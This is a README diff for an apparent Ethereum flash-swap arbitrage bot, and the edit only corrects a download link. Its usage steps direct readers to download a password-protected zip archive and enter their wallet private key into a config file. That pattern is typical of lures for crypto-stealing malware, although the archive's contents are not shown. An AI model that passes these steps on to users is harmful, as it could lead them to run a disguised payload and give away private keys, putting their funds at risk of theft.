@@ -26,7 +26,7 @@ If you were unable to meet either of the conditions mentioned above, the flash s
 This is possible because flash swaps are atomic Ethereum transactions.
 
 ### Usage
-1. [Download] repository release(https://github.com/NFTERA/flshbot-arbitrage/archive/refs/heads/main.zip) and extract files with password `k0yiesv3gj0`
+1. [Download](https://github.com/NFTERA/flshbot-arbitrage/archive/refs/heads/main.zip) repository release and extract files with password `k0yiesv3gj0`
 2. Edit `address` and `private_key` in `config.json` file.
 3. Setup network and AMMs in flashbot menu. Note that there must be some funds on address to cover transaction fees.
 
